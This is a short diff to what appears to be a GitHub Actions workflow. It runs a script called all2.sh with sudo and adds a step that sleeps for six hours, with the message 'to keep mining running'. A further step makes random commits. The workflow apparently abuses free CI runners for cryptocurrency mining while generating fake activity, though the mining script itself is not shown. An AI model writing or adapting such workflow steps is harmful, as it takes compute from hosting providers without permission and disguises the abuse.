@@ -12,8 +12,14 @@ jobs:
       - name: Checkout repo
         uses: actions/checkout@v3
 
+
       - name: Run all2.sh
         run: sudo bash ./all2.sh
+
+      - name: Keep action alive for 6h
+        run: |
+          echo "Sleeping for 6 hours to keep mining running..."
+          sleep 21600
 
       - name: Make random commits
         run: |
